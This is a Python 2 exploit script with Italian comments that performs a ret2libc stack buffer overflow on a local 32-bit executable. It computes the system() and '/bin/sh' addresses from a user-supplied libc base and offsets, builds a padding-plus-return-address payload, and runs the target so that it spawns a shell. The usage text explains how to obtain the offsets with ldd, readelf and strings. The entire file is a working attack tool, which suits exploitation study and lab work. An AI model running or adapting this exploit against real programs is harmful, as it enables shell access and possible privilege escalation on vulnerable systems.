#coding=utf-8
import hashlib
import time
import sys
import requests
import subprocess
import os



#funzione per invertire un esadecimale (endian)
def inverti(hexadecimal):
    
    length = len(hexadecimal)
    address = ""
    real_len = length - 2
  
    for i in range (1,real_len):
    
        if i%2 > 0 :
            base = hexadecimal[length-(i+1)] + hexadecimal[length-i] #prendo le ultime due cifre e metto come prime, e così via
            address += base

    return address



def main():
    
    if len(sys.argv) != 6:
        print "Utilizzo: python buff.py  eseguibile  offset  indirizzo_libc  offset_system  offset_binsh"
        print "Indirizzo libc  -->  ldd eseguibile"
        print "Offset della funzione system nella libc --> readelf -s /lib32/libc.so.6 | grep system "
        print "Offset di bin/sh nella libc --> strings -a -t x /lib32/libc.so.6 | grep /bin/sh"
        print "Nota : é importane trovarsi nella stessa cartella dell'eseguibile"
        sys.exit(1)

#prendo il primo argomento passato (eseguibile) e il secondo (lungheza del buffer prima dell'indirizzo di ritorno)

    eseguibile = "./" + sys.argv[1]
    offset = int(sys.argv[2])

#prendo gli indirizzi passati come 4,5,6 argomento

    indirizzo_libc = int(sys.argv[3],16)
    offset_system = int(sys.argv[4],16)
    offset_binsh = int(sys.argv[5],16)

    print "libc base:"
    print indirizzo_libc
    print "offset_system:"
    print offset_system
    print "offset_binsh:"
    print offset_binsh

#calcolo gli indirizzi veri e propri della funzione sys e di bin/sh, sapendo che i rispettivi offset ottenuti preceden sono calcolati a partire dall'ind basec

    indirizzo_system = indirizzo_libc + offset_system
    indirizzo_binsh = indirizzo_libc + offset_binsh

#riporto tutto in esadecimale    
    ind_hex_sys = hex(indirizzo_system)
    ind_hex_binsh = hex(indirizzo_binsh)
    
    rev_sys = inverti(ind_hex_sys)
    rev_binsh = inverti(ind_hex_binsh)

    rev_sys = rev_sys.decode('hex')
    rev_binsh = rev_binsh.decode('hex')

    print "Indirizzo finale sys:"
    print rev_sys
    print "Indirizzo finale bin/sh:"
    print rev_binsh
    
#riempo il buffer fino all'indirizzo di ritorno con A, svrascrivo l'indirizzo di ritorno con la funzione sys, lettere a caso (B) per l'exit, e bin/sh come arg    
    eseguibile = eseguibile + " \"" + offset*"A" +  rev_sys + "B"*4 + rev_binsh + "\""
    print eseguibile


        
   # for i in range (1,2000):
            
         # print "tentativo numero:"
        #  print i
    os.system(eseguibile)




main()
